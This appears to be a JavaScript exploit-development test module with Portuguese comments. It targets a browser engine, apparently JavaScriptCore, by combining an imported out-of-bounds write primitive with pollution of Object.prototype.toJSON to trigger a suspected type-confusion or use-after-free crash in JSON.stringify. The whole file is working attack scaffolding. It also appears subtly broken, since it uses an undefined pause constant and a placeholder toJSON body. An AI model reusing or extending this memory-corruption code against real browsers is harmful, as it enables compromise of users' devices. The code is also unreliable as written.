// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, oob_read_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

// Usaremos os parâmetros fixos que causavam o crash
const CRITICAL_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    value_to_write: 0xFFFFFFFF,
    bytes_to_write_for_corruption: 4,
    ppKey: 'toJSON',
    description: "CrashTest_JSONStringify_OriginalToJSON_0x70_FFFF"
};

let callCount_toJSON_crash_test = 0;

function originalCrashTest_toJSON() {
    const FNAME_toJSON = "originalCrashTest_toJSON";
    callCount_toJSON_crash_test++;
    if (callCount_toJSON_crash_test === 1) {
        document.title = `toJSON Call ${callCount_toJSON_crash_test} (OriginalCrash)`;
    }
    const currentOperationThis = this;
    logS3(`[${CRITICAL_PARAMS.ppKey} Poluído - OriginalCrash] Chamada ${callCount_toJSON_crash_test}!`, "vuln", FNAME_toJSON);
    logS3(`  [CALL ${callCount_toJSON_crash_test}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info", FNAME_toJSON);
    // ... (Restante da sua lógica complexa "v2 - Refinado" toJSON aqui)
    // Por brevidade, vou colocar um placeholder, mas você deve usar a sua original completa.
    try {
        let details = { byteLength: currentOperationThis.byteLength };
        logS3(`  [CALL ${callCount_toJSON_crash_test}] Detalhes: byteLength=${details.byteLength}`, "info", FNAME_toJSON);
        return { toJSON_executed: true, type: Object.prototype.toString.call(currentOperationThis), details: details, call: callCount_toJSON_crash_test };
    } catch (e) {
        logS3(`  [CALL ${callCount_toJSON_crash_test}] ERRO em toJSON: ${e.message}`, "critical", FNAME_toJSON);
        return { toJSON_error: true, message: e.message, call: callCount_toJSON_crash_test };
    }
}

export async function runOriginalCrashTest_FocusStringify() {
    const FNAME = CRITICAL_PARAMS.description;
    logS3(`--- Iniciando Teste de Crash Original com Foco em JSON.stringify: ${FNAME} ---`, "test", FNAME);
    document.title = "Iniciando: " + FNAME;

    callCount_toJSON_crash_test = 0;
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup.", "error", FNAME); return;
    }
    document.title = "OOB OK - " + FNAME;

    let victim_ab = new ArrayBuffer(CRITICAL_PARAMS.victim_ab_size);
    logS3(`victim_ab criado.`, "info", FNAME);

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, CRITICAL_PARAMS.ppKey);
    let pollutionApplied = false;
    let stepReached = "antes_pp";

    try {
        stepReached = "aplicando_pp";
        logS3(`Poluindo Object.prototype.${CRITICAL_PARAMS.ppKey}...`, "info", FNAME);
        document.title = "Aplicando PP - " + FNAME;
        Object.defineProperty(Object.prototype, CRITICAL_PARAMS.ppKey, {
            value: originalCrashTest_toJSON,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        logS3(`PP aplicada.`, "good", FNAME);
        stepReached = "pp_aplicada";
        document.title = "PP OK - " + FNAME;

        stepReached = "antes_escrita_oob";
        logS3(`CORRUPÇÃO: ${toHex(CRITICAL_PARAMS.value_to_write)} @ ${toHex(CRITICAL_PARAMS.corruption_offset)}`, "warn", FNAME);
        document.title = "Antes OOB Write - " + FNAME;
        oob_write_absolute(CRITICAL_PARAMS.corruption_offset, CRITICAL_PARAMS.value_to_write, CRITICAL_PARAMS.bytes_to_write_for_corruption);
        logS3("Escrita OOB feita.", "info", FNAME);
        stepReached = "apos_escrita_oob";
        document.title = "Após OOB Write - " + FNAME;

        await PAUSE_S3(SHORT_PAUSE_S3);

        // Teste B.1: Simplificar victim_ab
        let simpleVictims = [
            { name: "EmptyObject", victim: {} },
            { name: "SimpleObject", victim: { a: 1, b: "test" } },
            { name: "EmptyArray", victim: [] },
            { name: "SimpleArray", victim: [1, 2, 3] },
            { name: "OriginalVictimAB", victim: victim_ab } // O original por último
        ];

        for (const sv of simpleVictims) {
            stepReached = `antes_stringify_${sv.name}`;
            document.title = `Antes Strfy ${sv.name} - ${FNAME}`;
            logS3(`Chamando JSON.stringify para ${sv.name}...`, "info", FNAME);
            callCount_toJSON_crash_test = 0; // Resetar para cada tentativa de stringify
            let currentStringifyResult = null;
            try {
                currentStringifyResult = JSON.stringify(sv.victim); // PONTO CRÍTICO
                stepReached = `apos_stringify_${sv.name}`;
                document.title = `Strfy OK ${sv.name} - ${FNAME}`;
                logS3(`Resultado JSON.stringify(${sv.name}): ${String(currentStringifyResult).substring(0, 100)}... (Chamadas toJSON: ${callCount_toJSON_crash_test})`, "info", FNAME);
            } catch (e) {
                stepReached = `erro_stringify_${sv.name}`;
                document.title = `ERRO Strfy ${sv.name} - ${FNAME}`;
                logS3(`ERRO JSON.stringify(${sv.name}): ${e.name} - ${e.message}. (Chamadas toJSON: ${callCount_toJSON_crash_test})`, "critical", FNAME);
                // Se um erro ocorrer aqui, podemos querer parar ou continuar para ver se afeta os próximos
                // Por agora, vamos continuar.
            }
            if (document.title.startsWith("ERRO Strfy") || document.title.startsWith("CONGELOU?")) {
                 logS3(`Problema detectado com ${sv.name}, parando testes de stringify.`, "error", FNAME);
                 break; // Para a iteração de simpleVictims se um erro/crash ocorrer
            }
            await PAUSE_S3(SHORT_PAUSE_S3);
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "error", FNAME);
        document.title = "ERRO Principal - " + FNAME;
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, CRITICAL_PARAMS.ppKey, originalToJSONDescriptor);
            else delete Object.prototype[CRITICAL_PARAMS.ppKey];
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo: ${stepReached}`, "info", FNAME);
        if (!document.title.startsWith("ERRO") && !document.title.includes("OK")) {
             document.title = `CONGELOU? ${stepReached} - ${FNAME}`;
        }
    }
    logS3(`--- Teste de Crash Original Concluído: ${FNAME} ---`, "test", FNAME);
}

// Para ser chamado por runAllAdvancedTestsS3.mjs
export async function testJsonTypeConfusionUAFSpeculative() {
    await runOriginalCrashTest_FocusStringify();
}
